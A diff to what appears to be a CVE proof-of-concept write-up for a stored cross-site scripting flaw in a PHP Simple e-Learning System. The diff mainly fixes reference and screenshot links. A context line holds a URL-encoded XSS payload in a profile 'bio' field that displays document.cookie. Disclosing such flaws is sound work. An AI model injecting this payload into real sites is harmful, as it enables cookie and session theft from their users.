@@ -4,7 +4,7 @@
 #### Vendor: https://www.sourcecodester.com/users/tips23
 #### Software: https://www.sourcecodester.com/php-simple-e-learning-system-source-code
 #### Version: 1.0
-#### Reference: https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/POC.md
+#### Reference: https://github.com/CyberThoth/CVE/blob/f65282f1f22b659a26efbd4c394999932d6cd834/CVE/Simple%20e-Learning%20System/Cross%20Site%20Scripting(Stored)/POC.md
 
 
 #### Description：
@@ -46,8 +46,8 @@ Connection: close
 firstName=Claire&lastName=Blake&phoneNumber=2147483647&bio=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&profile-updateBtn=Update
 ```
 
-![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/1.png)
+![image](https://github.com/CyberThoth/CVE/blob/f65282f1f22b659a26efbd4c394999932d6cd834/CVE/Simple%20e-Learning%20System/Cross%20Site%20Scripting(Stored)/1.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/2.png)
+![image](https://github.com/CyberThoth/CVE/blob/f65282f1f22b659a26efbd4c394999932d6cd834/CVE/Simple%20e-Learning%20System/Cross%20Site%20Scripting(Stored)/2.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/3.png)
+![image](https://github.com/CyberThoth/CVE/blob/f65282f1f22b659a26efbd4c394999932d6cd834/CVE/Simple%20e-Learning%20System/Cross%20Site%20Scripting(Stored)/3.png)
